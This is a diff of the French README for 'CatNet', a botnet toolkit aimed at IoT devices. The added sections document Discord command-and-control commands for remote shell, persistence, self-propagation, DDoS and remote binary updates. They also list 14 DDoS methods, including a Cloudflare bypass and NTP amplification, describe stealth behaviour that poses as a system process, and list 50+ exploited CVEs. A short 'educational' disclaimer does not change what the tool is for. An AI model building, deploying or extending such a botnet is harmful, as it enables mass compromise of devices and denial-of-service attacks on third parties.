@@ -1,13 +1,11 @@
 ```
    ██████╗ █████╗ ████████╗███╗   ██╗███████╗████████╗
   ██╔════╝██╔══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
-  ██║     ███████║   ██║   ██╔██╗ ██║█████╗     ██║   
-  ██║     ██╔══██║   ██║   ██║╚██╗██║██╔══╝     ██║   
-  ╚██████╗██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
-   ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
+  ██║     ███████║   ██║   ██╔██╗ ██║█████╗     ██║
+  ██║     ██╔══██║   ██║   ██║╚██╗██║██╔══╝     ██║
+  ╚██████╗██║  ██║   ██║   ██║ ╚████║███████╗   ██║
+   ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
 ```
-
-<div align="center">
 
 ```
       /\_/\
@@ -17,7 +15,9 @@
     (_|   |_)
 ```
 
-**`[ BY CAT TOOLS // v2.0 // 2026 ]`**
+# CatNet
+
+**`[ BY CAT-PROJECT-HAT // v2.0 // 2026 ]`**
 
 *Scanner IoT educatif — Multi-archi — MikroTik — Mēris Takeover*
 
@@ -26,8 +26,6 @@
 ![Platform](https://img.shields.io/badge/Target-IoT%2FLinux-FF6B35?style=for-the-badge)
 ![Arch](https://img.shields.io/badge/Arch-MIPS%20%7C%20ARM%20%7C%20x86-blueviolet?style=for-the-badge)
 ![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)
-
-</div>
 
 ---
 
@@ -58,12 +56,133 @@ catnet/
 | ☁️ **Upload auto** | catbox.moe / transfer.sh / 0x0.st / serveur perso — URLs embarquées au build |
 | 🖥️ **Orchestration** | Sessions `screen`, scan par plages IP ou liste, jobs arrière-plan |
 | 📡 **MikroTik** | CVE-2018-14847 · Brute API 8728 · SSH · Mēris SOCKS5 takeover |
-| 💥 **HTTP Exploits** | Realtek · Huawei HG532 · D-Link · TP-Link · TOTOLINK · DVR · TR-069 |
+| 💥 **Exploits** | 50+ CVEs couvrant routeurs, caméras, VPN, serveurs web, switches |
 | 📊 **Log viewer** | Vue live scanner, cibles, imports, IDB — menu `[t]` |
 
 ---
 
-## 🔌 Ports par défaut
+## 💬 Commandes du bot (Discord C2)
+
+Le bot répond à `!<botID> <cmd>` ou `!all <cmd>` pour cibler tous les bots.
+
+| Commande | Description |
+|----------|-------------|
+| `!all shell <cmd>` | Exécute une commande shell et retourne le résultat |
+| `!all info` | Infos système : arch, OS, kernel, user, CPU, RAM, IP |
+| `!all persist` | Installe la persistance (cron, rc.local, init.d) |
+| `!all spread [port] [workers]` | Lance la propagation automatique (zmap ou TCP natif) |
+| `!all spread stop` | Stoppe la propagation |
+| `!all ddos <ip> <port> <sec> [METHOD] [workers]` | Lance une attaque DDoS |
+| `!all ddos methods` | Liste toutes les méthodes DDoS disponibles |
+| `!all ddos stop` | Stoppe l'attaque en cours |
+| `!all update <url>` | Met à jour le binaire depuis une URL |
+| `!all kill` | Termine le bot |
+| `!all help` | Affiche l'aide |
+
+### Méthodes DDoS
+
+| Méthode | Description |
+|---------|-------------|
+| `UDP` | UDP flood — raw packets |
+| `TCP` | TCP connect flood |
+| `HTTP` | HTTP GET flood |
+| `POST` | HTTP POST flood |
+| `HTTPS` | TLS/SSL handshake flood |
+| `BYPASS` | Browser spoof — contournement Cloudflare |
+| `SYN` | SYN flood |
+| `SLOWLORIS` | Keepalive starvation |
+| `RUDY` | R-U-Dead-Yet — slow POST |
+| `DNS` | DNS query flood |
+| `NTP` | NTP amplification ×4000 |
+| `VSE` | Game server flood |
+| `MIX` | Toutes les méthodes combinées |
+| `AUTO` | Auto perf-scaled (recommandé) |
+
+### Comportement du bot
+
+- **selfHide** — copie sous un nom de processus système (`systemd-worker`, `kworker`, `syslogd`, `ntpd`...) et supprime l'original
+- **pingBeacon** — ping silencieux du C2 au démarrage pour signaler la présence
+- **spread** — propagation autonome via zmap si disponible, sinon TCP natif
+- **persist** — injection dans cron, rc.local ou init.d selon ce qui est accessible
+
+---
+
+## 🎯 CVEs ciblés
+
+### Routeurs & IoT
+
+| CVE | Cible | Type |
+|-----|-------|------|
+| CVE-2018-14847 | MikroTik RouterOS < 6.42.1 (Winbox) | Path traversal → creds plaintext |
+| CVE-2021-35395 | Realtek SDK (centaines de modèles) | RCE non authentifié |
+| CVE-2021-35394 | Realtek Jungle SDK (UDPServer) | Command injection |
+| CVE-2018-10561/10562 | GPON Dasan/Huawei | Bypass auth + RCE |
+| CVE-2022-30525 | Zyxel USG/ATP/VPN firewall | RCE non authentifié |
+| CVE-2017-18368 | ZyXEL P660HN-T1A | RCE non authentifié |
+| CVE-2016-20016 | MVPower DVR | Shell RCE (Mirai variant) |
+| CVE-2020-25506 | D-Link DNS-320 | RCE non authentifié |
+| CVE-2020-10987 | Tenda AC15/AC18 | RCE via goform/setUsbUnload |
+| CVE-2019-12780 | Belkin/Linksys N750/N900 | RCE via ping_target |
+| CVE-2023-1389 | TP-Link Archer AX21 | Command injection |
+| CVE-2024-12987 | DrayTek Vigor | Command injection non authentifié |
+| CVE-2024-11237 | TP-Link VN020-F3v(T) | Stack overflow / command injection |
+| CVE-2024-3721 | TP-Link Archer | Command injection via PPTP |
+| CVE-2024-3080 | ASUS RT-AX/AC/N | Auth bypass + command injection |
+| CVE-2019-1652/1653 | Cisco RV320/RV325 | Config dump + RCE |
+| CVE-2023-20198 | Cisco IOS XE Web UI | Privilege escalation |
+| CVE-2017-6334 | Netgear DGN2200/DGND3700 | RCE via dnslookup.cgi |
+| CVE-2026-0625 | D-Link DSL/DIR/DNS | Command injection via dnscfg.cgi |
+| CVE-2026-36540 | Netis AC1200 NC21 | Command injection pré-auth |
+| CVE-2026-27849 | Linksys mesh | Command injection pré-auth |
+
+### Caméras & DVR
+
+| CVE | Cible | Type |
+|-----|-------|------|
+| CVE-2021-36260 | Hikvision (millions de caméras) | RCE non authentifié |
+| CVE-2018-9995 | DVR TVT/HiSilicon | Bypass auth + RCE |
+| CVE-2020-25078 | D-Link DCS series | Info leak + RCE |
+| CVE-2024-7029 | AVTECH IP cameras | Command injection |
+| CVE-2025-1316 | Edimax IC-7100 | OS command injection |
+| CVE-2026-22755 | Vivotek IP Camera | Command injection via upload_map.cgi |
+| CVE-2026-32649 | Milesight camera | Command injection pré-auth |
+
+### VPN & Firewalls
+
+| CVE | Cible | Type |
+|-----|-------|------|
+| CVE-2018-13379 | FortiGate SSL-VPN | Path traversal |
+| CVE-2019-11510 | Pulse Secure VPN | File read pré-auth |
+| CVE-2019-19781 | Citrix ADC / NetScaler | RCE pré-auth |
+| CVE-2021-20016 | SonicWall SSLVPN | SQL injection → credentials |
+| CVE-2021-22986 | F5 BIG-IP iControl REST | RCE non authentifié |
+| CVE-2020-5902 | F5 BigIP TMUI | RCE |
+| CVE-2020-12271 | Sophos XG Firewall | SQLi/RCE pré-auth |
+| CVE-2024-9463 | Palo Alto Expedition | Command injection pré-auth |
+| CVE-2024-11667 | Zyxel USG FLEX / ATP | Path traversal + command injection |
+| CVE-2025-23006 | SonicWall SMA | OS command injection pré-auth |
+| CVE-2025-0108 | Palo Alto PAN-OS | Auth bypass via path confusion |
+
+### Serveurs web & frameworks
+
+| CVE | Cible | Type |
+|-----|-------|------|
+| CVE-2021-41773/42013 | Apache httpd | Path traversal → RCE |
+| CVE-2020-1938 | Apache Tomcat (Ghostcat) | AJP injection |
+| CVE-2022-26134 | Confluence | OGNL injection RCE |
+| CVE-2020-14882 | Oracle WebLogic | RCE |
+| CVE-2021-41378 | Atlassian Jira | Expression Language injection |
+| CVE-2021-22911 | Nextcloud | File upload RCE |
+| CVE-2020-11738 | Shellshock CGI/Bash | Command injection |
+| CVE-2022-22965 | Spring Framework (Spring4Shell) | RCE (JDK 9+) |
+| CVE-2024-36401 | GeoServer | OGC eval injection |
+| CVE-2024-4577 | PHP CGI | Argument injection |
+| CVE-2024-21887 | Ivanti Connect Secure / CSA | Command injection pré-auth |
+| CVE-2024-6387 | OpenSSH (regreSSHion) | RCE Linux glibc |
+
+---
+
+## 🔌 Ports scannés par défaut
 
 ```
 ┌────────┬──────────────────────────────┐
@@ -90,7 +209,7 @@ catnet/
 
 ## 📦 Installation
 
-> Le programme **ne gère pas les dépendances automatiquement** — tout est manuel.
+> Le programme **ne gère pas les dépendances automatiquement**.
 
 ### 🐍 Python 3.10+
 ```bash
@@ -116,7 +235,8 @@ echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc && source ~/.bashrc
 ```bash
 sudo apt install -y zmap
 ```
-> **Raspberry Pi / ARM** — compiler depuis les sources si apt absent :
+
+> **Raspberry Pi / ARM** — compiler depuis les sources :
 > ```bash
 > sudo apt install -y cmake libgmp-dev libpcap-dev libjson-c-dev libbytesize-dev
 > git clone https://github.com/zmap/zmap.git && cd zmap
@@ -157,12 +277,12 @@ sudo python3 main.py
 ## 🔄 Flux de travail
 
 ```
-[1] Services      →  configurer IP C2, port, mode distrib
-[2] Compiler bot  →  compile bot_discord.go toutes archi
-[3] Upload        →  upload binaires catbox.moe / serveur perso
+[1] Services       →  configurer IP C2, port, mode distrib
+[2] Compiler bot   →  compile bot_discord.go toutes archi
+[3] Upload         →  upload binaires catbox.moe / serveur perso
 [4] Compiler fiber →  scanner avec URLs bots embarquées
-[5] Lancer scan   →  plage IP ou liste, choix ports
-[t] Logs live     →  suivi en direct du scan
+[5] Lancer scan    →  plage IP ou liste, choix ports
+[t] Logs live      →  suivi en direct du scan
 ```
 
 ---
@@ -194,10 +314,16 @@ sudo apt install -y screen
 zmap n'a trouvé aucun host ouvert sur ce port. fiber attend stdin indéfiniment — tuer le screen, changer de plage ou de port.
 
 **`asm/socket.h: No such file or directory`**
-Voir section compilateurs croisés — symlinks asm-generic manquants.
+Symlinks asm-generic manquants — voir section compilateurs croisés.
 
 **Bot ne s'exécute pas sur la cible**
 `file bot.arm` pour vérifier l'archi. Utiliser `bot.mipsle` pour MIPS little-endian.
+
+---
+
+## Disclaimer
+
+> **Ce projet est strictement educatif.** L'utilisation de cet outil sur des systemes sans autorisation explicite est illegale. Les auteurs ne sont pas responsables de toute utilisation abusive. Respectez la loi.
 
 ---
 
@@ -208,8 +334,7 @@ Voir section compilateurs croisés — symlinks asm-generic manquants.
 ---
 
 ```
-   /\_/\
-  ( o.o )   CATNET v2.0 // BY CAT TOOLS // 2026
-   > ^ <
-  /_____\
+/\_/\
+( o.o )   CATNET v2.0 // BY CAT-PROJECT-HAT // 2026
+ > ^ <
 ```
